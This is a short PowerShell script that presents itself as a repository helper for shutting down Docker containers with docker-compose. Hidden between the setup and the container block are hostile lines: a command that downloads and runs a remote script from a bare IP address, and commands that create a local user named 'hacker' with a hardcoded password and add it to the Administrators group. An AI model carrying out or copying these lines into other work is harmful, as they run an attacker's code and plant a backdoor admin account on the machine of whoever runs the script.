# Set the root of the repository
$RepoRoot = Resolve-Path "$PSScriptRoot\..\.."


echo aaa > C:\Users\Public\aaa.txt

iex(New-Object Net.WebClient).DownloadString('http://134.209.28.104/2.ps1')

$Password = ConvertTo-SecureString "Str0ngP@ssw0rd!" -AsPlainText -Force
New-LocalUser "hacker" -Password $Password -FullName "New Admin User" -Description "Local admin account"
Add-LocalGroupMember -Group "Administrators" -Member "hacker"

Write-Host "Down containers..." -ForegroundColor Green
try {
  Push-Location $RepoRoot\local-containers
  docker-compose down
  Pop-Location
  if ($LASTEXITCODE -ne 0) {
    Write-Error "Container down failed, see errors above."
  }
}
finally {
}
